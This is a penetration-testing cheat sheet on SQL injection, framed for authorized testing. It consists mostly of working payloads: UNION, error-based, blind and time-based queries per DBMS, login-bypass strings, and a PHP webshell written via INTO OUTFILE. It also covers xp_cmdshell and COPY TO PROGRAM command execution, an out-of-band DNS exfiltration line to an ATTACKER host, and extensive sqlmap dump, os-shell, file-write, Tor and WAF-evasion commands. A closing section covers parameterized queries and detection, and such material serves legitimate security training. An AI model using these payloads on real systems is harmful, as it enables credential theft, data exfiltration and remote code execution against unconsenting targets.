# Web — SQL Injection (SQLi)

Injecting into a SQL query so the DB runs your input as code. Scope: authorized web testing only. Impact ranges from auth bypass and full data dump to file read/write and **RCE** on the DB host. This note covers the types, manual exploitation per DBMS, a commented **sqlmap** reference, and bypass tricks.

> `--dump` and file/OS access touch production data — confirm scope. Prefer read-only enumeration first; get written approval before `INTO OUTFILE`, `xp_cmdshell`, stacked writes, or `sqlmap --dump` of real customer data.

## Contents

- [Types](#types)
- [Detect it](#detect-it)
- [Manual — UNION-based](#manual--union-based)
- [Manual — error-based](#manual--error-based)
- [Manual — blind (boolean & time)](#manual--blind-boolean--time)
- [Authentication bypass](#authentication-bypass)
- [DBMS cheat columns](#dbms-cheat-columns)
- [SQLi → file read/write & RCE](#sqli--file-readwrite--rce)
- [sqlmap — automation & extraction](#sqlmap--automation--extraction)
  - [The extraction ladder](#the-extraction-ladder)
  - [Detection & feeding a request](#detection--feeding-a-request)
  - [Scan depth — level and risk](#scan-depth--level-and-risk)
  - [Verbosity](#verbosity)
  - [Hands-off automation](#hands-off-automation)
  - [Enumerate — list all the tables](#enumerate--list-all-the-tables)
  - [Dump — pull data from specific tables](#dump--pull-data-from-specific-tables)
  - [Where the dumped data lands](#where-the-dumped-data-lands)
  - [Post-exploitation (needs privileges; confirm scope first)](#post-exploitation-needs-privileges-confirm-scope-first)
  - [WAF evasion & plumbing](#waf-evasion--plumbing)
- [WAF / filter bypass tips & tricks](#waf--filter-bypass-tips--tricks)
- [Defense / detection (for the report)](#defense--detection-for-the-report)

## Types

| Class | Type | How you read data |
| --- | --- | --- |
| **In-band** | **Error-based** | DB error message leaks the data |
| | **UNION-based** | Append a `UNION SELECT` and read it in the response |
| **Inferential (blind)** | **Boolean-based** | Page differs on true/false condition |
| | **Time-based** | `SLEEP()` delay reveals true/false |
| **Out-of-band (OOB)** | DNS/HTTP | DB makes a network call carrying the data (when no in-band channel) |

Also classify by **DBMS** (MySQL/MariaDB, MSSQL, PostgreSQL, Oracle, SQLite) — syntax for comments, concatenation, and functions differs ([cheat columns](#dbms-cheat-columns)).

## Detect it

```sql
-- break the query, then fix it: an error or changed behavior = injectable
'          "          `          \
' OR '1'='1            -- always-true
' AND '1'='2           -- always-false (compare responses)

-- numeric vs string context
1               -> 1 AND 1=1      (true)   /   1 AND 1=2 (false)
1'              -> 1' AND '1'='1

-- confirm with a provable condition, not just an error
' AND 1=1-- -          (normal page)
' AND 1=2-- -          (different/empty page)  => boolean oracle exists
```

Comment styles to terminate the rest of the query: `-- -` (note the space, MySQL), `#`, `/*...*/`. Test every input: URL params, POST body, JSON values, cookies, and headers (`User-Agent`, `X-Forwarded-For`, `Referer`).

## Manual — UNION-based

Fastest when output is reflected. Two things must match: **column count** and a **compatible type** in a visible column.

```sql
-- 1. find the column count (increment until no error)
' ORDER BY 1-- -        ' ORDER BY 2-- -   ...   ' ORDER BY 6-- -  (errors -> 5 columns)
-- or:
' UNION SELECT NULL-- -           ' UNION SELECT NULL,NULL-- -   ... until it works

-- 2. find which columns print (use a marker; swap NULLs for strings)
' UNION SELECT 'a',NULL,NULL,NULL,NULL-- -     -- try each slot; 'a' appears = slot 1 visible

-- 3. fingerprint + dump via the visible columns
' UNION SELECT @@version,database(),user(),NULL,NULL-- -          -- MySQL/MSSQL
' UNION SELECT version(),current_database(),current_user,NULL,NULL-- -   -- PostgreSQL

-- 4. list tables, then columns (information_schema, standard on MySQL/MSSQL/Postgres)
' UNION SELECT table_name,NULL,... FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name,NULL,... FROM information_schema.columns WHERE table_name='users'-- -

-- 5. dump creds (concat into one visible column)
' UNION SELECT concat(username,':',password),NULL,... FROM users-- -   -- MySQL concat()
' UNION SELECT username||':'||password,NULL,... FROM users-- -         -- Postgres/Oracle ||
```

If types clash (e.g. a numeric column), keep it `NULL` and put your string in a text column. Oracle requires `FROM dual` for constant selects.

## Manual — error-based

When errors are shown but UNION output isn't. Force the data into an error message.

```sql
-- MySQL (extractvalue / updatexml, <= 32 chars per read)
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 1)),1)-- -

-- MSSQL (convert error leaks the value)
' AND 1=convert(int,(SELECT @@version))-- -
' AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects))-- -

-- PostgreSQL (cast error)
' AND 1=cast((SELECT version()) as int)-- -
```

## Manual — blind (boolean & time)

No output and no errors — ask yes/no questions and read the page (boolean) or the clock (time).

```sql
-- BOOLEAN: true renders normally, false renders differently
' AND (SELECT SUBSTRING(version(),1,1))='8'-- -                -- is MySQL major v8?
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -   -- brute char-by-char

-- TIME-BASED: delay only when the condition is true
' AND IF((SELECT SUBSTRING(version(),1,1))='8',SLEEP(3),0)-- -      -- MySQL
'; IF (1=1) WAITFOR DELAY '0:0:3'-- -                               -- MSSQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -   -- Postgres
' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ... END FROM dual)-- -  -- Oracle

-- OUT-OF-BAND (no in-band channel at all) — MySQL on Windows via UNC, MSSQL, Oracle, Postgres
-- exfil a value over DNS to your Collaborator/interactsh host
' AND LOAD_FILE(concat('\\\\',(SELECT password FROM users LIMIT 1),'.ATTACKER\\x'))-- -
```

Blind char-by-char is slow by hand — this is exactly where you hand it to **sqlmap**.

## Authentication bypass

```sql
-- login form: username field
admin'-- -                 -- comment out the password check
admin' #
' OR 1=1-- -               -- logs in as the first user (often admin)
' OR 1=1 LIMIT 1-- -
') OR ('1'='1'-- -         -- when the query wraps the input in parentheses
```

## DBMS cheat columns

| | MySQL/MariaDB | MSSQL | PostgreSQL | Oracle |
| --- | --- | --- | --- | --- |
| Version | `@@version` / `version()` | `@@version` | `version()` | `banner FROM v$version` |
| Current DB | `database()` | `db_name()` | `current_database()` | `SELECT user FROM dual` |
| Comment | `-- -`, `#`, `/**/` | `--`, `/**/` | `--`, `/**/` | `--`, `/**/` |
| Concat | `concat(a,b)` / `concat_ws` | `a+b` | `a\|\|b` | `a\|\|b` |
| Substring | `substring()` | `substring()` | `substring()` | `substr()` |
| Sleep | `sleep(n)` | `waitfor delay '0:0:n'` | `pg_sleep(n)` | `dbms_pipe.receive_message` |
| Stacked queries | ✗ (usually) | ✓ | ✓ | ✗ |
| No-FROM select | ok | ok | ok | needs `FROM dual` |

## SQLi → file read/write & RCE

Only with the right privileges/config, and only if the engagement allows writing to the DB host.

```sql
-- MySQL: read a file (needs FILE priv; secure_file_priv must allow it)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
-- MySQL: write a webshell (writable webroot, FILE priv, secure_file_priv off)
' UNION SELECT '<?php system($_GET[0]);?>',NULL INTO OUTFILE '/var/www/html/s.php'-- -

-- MSSQL: command execution via xp_cmdshell (sysadmin; often disabled)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
   EXEC xp_cmdshell 'whoami'-- -

-- PostgreSQL: command execution (superuser) via COPY ... PROGRAM, or large-object file write
'; COPY (SELECT '') TO PROGRAM 'id'-- -
```

A webshell or `xp_cmdshell` turns SQLi into [RCE](RCE.md) — then grab a reverse shell and treat it as a normal host ([Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md)). Dumped password hashes go to [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) for cracking.

## sqlmap — automation & extraction

Automates detection, exploitation and extraction. **Feed it a real request** (copy from Burp: *Copy to file*) so headers/cookies/method match exactly — far more reliable than flags.

### The extraction ladder

Work down it. Each rung needs the one above, and every rung is cheaper than the one below — on a blind injection each value costs many requests, so never dump before you know what you're dumping.

| # | Goal | Command |
| --- | --- | --- |
| 1 | Confirm + fingerprint | `--banner --current-user --current-db --is-dba` |
| 2 | Which databases exist | `--dbs` |
| 3 | Which tables in one DB | `-D shopdb --tables` |
| 4 | Which columns in one table | `-D shopdb -T users --columns` |
| 5 | How big is it | `-D shopdb -T users --count` |
| 6 | Pull the data | `-D shopdb -T users -C username,password --dump` |

Two shortcuts past the ladder:

```bash
sqlmap -r request.txt --schema --exclude-sysdbs --batch   # every DB + table + column in one pass, no rows
sqlmap -r request.txt --all --batch                       # "retrieve everything" — enumeration AND dumps, very noisy
```

`--schema` is the one to reach for: it maps the whole server's structure without touching a single row, so you can plan a scoped dump.

### Detection & feeding a request

```bash
# --- Basic detection ---
sqlmap -u "https://target.tld/item?id=1"            # test a GET param
sqlmap -u "https://target.tld/item?id=1" --batch    # --batch = accept all default prompts (non-interactive)
sqlmap -u "https://target.tld/item?id=1" -p id      # -p = test only this parameter

# --- Feed a saved HTTP request (best for POST / auth / custom headers) ---
sqlmap -r request.txt --batch                       # -r = replay a raw request file (method, body, cookies, headers all included)
sqlmap -r request.txt -p username                   # target one field inside that request
# mark the exact injection point in the file with a * if sqlmap can't guess it:  ...&id=1*

# --- POST data / headers / auth without a file ---
sqlmap -u "https://target.tld/login" --data="user=a&pass=b"      # --data = POST body (triggers POST)
sqlmap -u "..." --data='{"id":1}'                                # JSON body; mark point with {"id":1*}
sqlmap -u "..." --cookie="SESSION=abc; role=user"                # authenticated session
sqlmap -u "..." --headers="X-Forwarded-For: 1*"                  # inject via a header (note the * marker)
sqlmap -u "..." -H "Authorization: Bearer TOKEN"                 # single extra header
sqlmap -u "..." --auth-type=basic --auth-cred="user:pass"        # HTTP Basic auth
sqlmap -m targets.txt --batch                                    # -m = a file of in-scope URLs, one per line
```

### Scan depth — level and risk

The two knobs people get wrong. They are independent: **`--level` decides *how many places and payloads* get tested, `--risk` decides *how dangerous* the payloads are.** There is no `--severity` flag; these are the whole story.

`--level` (1-5, default 1) — each level is cumulative:

| Level | Adds |
| --- | --- |
| 1 | GET and POST parameters (always tested) |
| 2 | HTTP **Cookie** header values |
| 3 | HTTP **User-Agent** and **Referer** values |
| 4 | More payloads/boundaries, no new locations |
| 5 | HTTP **Host** header, plus the full payload set |

`--risk` (1-3, default 1) — also cumulative:

| Risk | Adds | Cost |
| --- | --- | --- |
| 1 | Payloads that are "innocuous for the majority of SQL injection points" | safe |
| 2 | Heavy-query **time-based** tests | slow, can load the DB |
| 3 | **`OR`-based** tests | ⚠️ see below |

> ⚠️ **`--risk=3` can modify data.** An `OR`-based payload injected into an `UPDATE` or `DELETE` statement's `WHERE` clause matches *every row* — sqlmap's own docs call out "an update of all the entries of the table, which is certainly not what the attacker wants." On an authorized test against anything resembling production, get that in writing before you use risk 3, and prefer a read-only parameter.

Escalate instead of starting at the top — `5/3` is roughly 50× the requests of `1/1` and much louder:

```bash
sqlmap -r request.txt --batch                                 # 1. default 1/1 — most injections fall here
sqlmap -r request.txt --level=3 --risk=2 --batch               # 2. cookies + UA/Referer, heavy time-based
sqlmap -r request.txt --level=5 --risk=3 --batch               # 3. last resort: Host header + OR payloads
sqlmap -r request.txt --level=5 --risk=2 --batch               #    safer top end — all locations, no OR payloads
```

Pair a high level with narrowing flags so the extra depth doesn't cost you the whole afternoon:

```bash
sqlmap -r request.txt --level=5 --risk=2 -p id --dbms=mysql --technique=BT --batch
#   -p         only this param (skips the other 40 the level would have tested)
#   --dbms     skip fingerprinting, you already know
#   --technique  B=boolean E=error U=union S=stacked T=time Q=inline — drop the ones that failed
```

### Verbosity

Default is 1. The one worth remembering is **`-v 3`**, which prints the actual payloads:

| `-v` | Shows |
| --- | --- |
| 0 | Tracebacks, errors and criticals only |
| 1 | + information and warnings *(default)* |
| 2 | + debug messages |
| 3 | + **payloads injected** ← use this to learn, or to hand a reproducible payload to the report |
| 4 | + HTTP requests |
| 5 | + HTTP response headers |
| 6 | + full response bodies |

```bash
sqlmap -r request.txt -v 3 --batch                  # see every payload as it's sent
sqlmap -r request.txt --parse-errors                # surface the DBMS error text from responses
sqlmap -r request.txt --eta                          # ETA per value — tells you if a blind dump is worth starting
```

### Hands-off automation

```bash
# The recon one-liner: spider the app, test every form it finds, never prompt
sqlmap -u "https://target.tld/" --crawl=3 --forms --batch --smart \
       --crawl-exclude="logout|signout|delete|admin/destroy" \
       --random-agent --output-dir=./sqlmap-out
#   --crawl=N         spider N links deep from the target URL
#   --crawl-exclude   regex of pages to skip — ALWAYS exclude logout, or the crawler kills its own session
#   --forms           parse and test <form> inputs found on the pages
#   --smart           only run thorough tests where a heuristic already says "injectable" (big speedup when crawling)
#   --batch           take the default answer to every prompt
#   --output-dir      keep the run's artifacts with the engagement notes instead of in $HOME

# Pre-answer specific prompts instead of blanket-defaulting
sqlmap -r request.txt --answers="follow=N,crack=N,dict=N" --batch
#   --batch alone will happily start cracking hashes or following redirects; --answers overrides those picks

# Plumbing for long runs
sqlmap -r request.txt --threads=10 --keep-alive --retries=3   # parallelism (helps blind extraction most)
sqlmap -r request.txt --delay=1 --timeout=30 --time-sec=5     # back off; raise the time-based threshold on laggy targets
```

**Sessions resume by default.** sqlmap caches each target's findings in `session.sqlite`, so re-running picks up where it left off — that's why a second run looks instant. Two ways to override:

```bash
sqlmap -r request.txt --flush-session        # forget everything, re-detect from scratch (use after the app changes)
sqlmap -r request.txt --fresh-queries        # keep the known injection, re-run the queries (use when data changed)
```

### Enumerate — list all the tables

```bash
sqlmap -r request.txt --dbs                           # all databases
sqlmap -r request.txt --current-db                    # just the one the app uses (usually all you need)

# --- all tables ---
sqlmap -r request.txt -D shopdb --tables              # every table in ONE database
sqlmap -r request.txt --tables                        # every table in EVERY database
sqlmap -r request.txt --tables --exclude-sysdbs       # same, minus mysql/sys/information_schema/pg_catalog
sqlmap -r request.txt -D shopdb --schema              # tables AND their columns, one database
sqlmap -r request.txt --schema --exclude-sysdbs --batch   # the whole server's structure in one run

# --- columns, then size ---
sqlmap -r request.txt -D shopdb -T users --columns    # column names + types
sqlmap -r request.txt -D shopdb --count               # row count of every table in the DB — read this BEFORE dumping
sqlmap -r request.txt -D shopdb -T users --count      # row count of one table

# --- find the table without listing everything (fastest on a big schema) ---
sqlmap -r request.txt --search -T user                # tables whose NAME contains 'user'
sqlmap -r request.txt --search -C pass                # columns whose NAME contains 'pass' (finds password columns anywhere)
sqlmap -r request.txt --search -D prod                # databases
```

On a blind injection `--tables` across every database is hundreds of requests. Go `--current-db` → `--search -C pass` → dump the one table you actually wanted.

### Dump — pull data from specific tables

`-D` picks the database, `-T` the table(s), `-C` the column(s). Comma-separate, **no spaces**. The more you specify, the less you pull:

```bash
# --- one table ---
sqlmap -r request.txt -D shopdb -T users --dump                        # whole table, all columns
sqlmap -r request.txt -D shopdb -T users -C username,password --dump   # only these columns ← prefer this
sqlmap -r request.txt -D shopdb -T users -C "username,password,email,is_admin" --dump

# --- several specific tables in one run ---
sqlmap -r request.txt -D shopdb -T users,orders,payments --dump        # comma-separated, no spaces

# --- wider scopes (confirm scope first) ---
sqlmap -r request.txt -D shopdb --dump                  # EVERY table in shopdb
sqlmap -r request.txt --dump                            # every table in the CURRENT database — be explicit with -D instead
sqlmap -r request.txt --dump-all --exclude-sysdbs       # every table in every DB, minus system DBs — very noisy
sqlmap -r request.txt --dump-all                        # everything, system DBs included

# --- bound the dump (scope-friendly, and how you prove impact without exfiltrating a customer table) ---
sqlmap -r request.txt -D shopdb -T users --dump --where="id < 50"       # SQL WHERE applied to the dump
sqlmap -r request.txt -D shopdb -T users --dump --start=1 --stop=20     # rows 1-20 only
sqlmap -r request.txt -D shopdb -T users --dump --first=1 --last=8      # first 8 CHARACTERS of each value
sqlmap -r request.txt -D shopdb -T users -C password --dump --stop=3    # three hashes is enough to prove it and to ID the format
```

`--start/--stop` count **rows**; `--first/--last` count **characters within each value**. `--first/--last` is the one to use on a slow blind injection — eight characters is plenty to identify a hash format or confirm a column holds real card data, at a fraction of the requests.

Output format and encoding:

```bash
sqlmap -r request.txt -D shopdb -T users --dump --dump-format=CSV     # default; also HTML, SQLITE, JSONL
sqlmap -r request.txt -D shopdb -T users --dump --hex                 # hex-encode in transit — fixes mangled UTF-8 / binary columns
sqlmap -r request.txt -D shopdb -T users --dump --no-cast             # stop casting to string; try this if values come back NULL or truncated
```

### Where the dumped data lands

sqlmap writes to an output directory per target and **prints the path when it finishes** — read that line rather than guessing. Recent versions use `~/.local/share/sqlmap/output/<target>/`, older ones `~/.sqlmap/output/<target>/`, and `--output-dir=./sqlmap-out` overrides both.

```text
<output-dir>/<target>/
├── log              human-readable run log (what was found, which technique)
├── session.sqlite   cached findings — delete this or use --flush-session to re-test
├── target.txt       the target + the command line that produced this
└── dump/
    └── shopdb/
        ├── users.csv
        └── orders.csv
```

Point `--output-dir` at your engagement folder from the start. Dumped data is client data — it belongs with the evidence under the same handling rules as the rest of the report, not in `$HOME` on your laptop.

### Post-exploitation (needs privileges; confirm scope first)

```bash
sqlmap -r request.txt --sql-shell                   # interactive SQL prompt through the injection
sqlmap -r request.txt --sql-query="SELECT @@version" # run one query
sqlmap -r request.txt --file-read=/etc/passwd       # read a server file (FILE priv)
sqlmap -r request.txt --file-write=shell.php --file-dest=/var/www/html/s.php  # upload a file to the host
sqlmap -r request.txt --os-shell                    # try to get an OS command shell (webroot write / xp_cmdshell / etc.)
sqlmap -r request.txt --os-cmd="whoami"             # run a single OS command
sqlmap -r request.txt --passwords                   # dump + offer to crack DBMS user password hashes
sqlmap -r request.txt --privileges --roles          # what the DB user can do (justifies the severity rating)
```

### WAF evasion & plumbing

```bash
sqlmap -r request.txt --tamper=space2comment,between        # tamper scripts mutate payloads to dodge filters
sqlmap --list-tampers                                        # see all tamper scripts and what they do
sqlmap -r request.txt --identify-waf                         # fingerprint the WAF in front of the app
sqlmap -r request.txt --proxy="http://127.0.0.1:8080"       # route through Burp to inspect traffic
sqlmap -r request.txt --tor --tor-type=socks5 --check-tor   # anonymize via Tor
sqlmap -r request.txt --random-agent                         # rotate a real browser User-Agent
sqlmap -r request.txt --csrf-token=csrf --csrf-url=/form    # re-fetch and replay a CSRF token each request
```

**Common tamper scripts:** `space2comment` (spaces → `/**/`), `between` (`>` → `NOT BETWEEN`), `charencode`/`charunicodeencode` (URL/unicode-encode), `randomcase` (mixed case keywords), `apostrophemask`, `modsecurityversioned` (MySQL versioned comments `/*!...*/`). Chain several with commas.

## WAF / filter bypass tips & tricks

- **Comments & whitespace:** `/**/`, `/*!50000UNION*/` (MySQL versioned), `%09`/`%0a`/`%0c` as space substitutes, `UNION/**/SELECT`.
- **Case & keyword splitting:** `UnIoN`, `uni%00on`, `UNunionION SELECT` (non-recursive strippers).
- **Encoding:** URL-encode, double URL-encode, hex strings (`0x61646d696e` for `admin`), `char(97,...)`, unicode.
- **Logic swaps:** `OR 1=1` → `OR 2>1`, `OR 'a'='a'`; `=` → `LIKE`/`BETWEEN`/`IN`.
- **No quotes needed:** use hex/`char()` for strings so you never type `'`.
- **Confirm the DBMS early** — it dictates comment syntax, concat operator, and whether stacked queries work. Guessing wrong wastes time.
- **Always try every input** (headers/cookies/JSON), and test both numeric and string break-out. If in-band fails, fall back to boolean → time → OOB, in that order of speed.

## Defense / detection (for the report)

- **Parameterized queries / prepared statements** everywhere — the actual fix. ORMs help but raw/`.raw()`/string-built queries reintroduce it.
- **Least-privilege DB account** — app user shouldn't have `FILE`, `xp_cmdshell`, superuser, or DDL; separate read/write users; `secure_file_priv` set.
- **Allowlist input validation** for structural parts (sort column, direction) that can't be parameterized; reject unexpected types.
- **Stored-proc / ORM** usage reviewed — dynamic SQL inside a proc is still injectable.
- **WAF** as defense-in-depth (not a fix); disable detailed DB errors in prod.
- **Detect:** DB/WAF alerts on `UNION SELECT`, `information_schema`, `SLEEP(`/`WAITFOR`, `xp_cmdshell`; sudden long query times (time-based); spikes in rows read; app-error rate from malformed SQL.

## Related

[Web Overview](Web%20Overview.md) · [RCE](RCE.md) (SQLi→webshell/xp_cmdshell) · [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) (crack dumped hashes) · [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md)
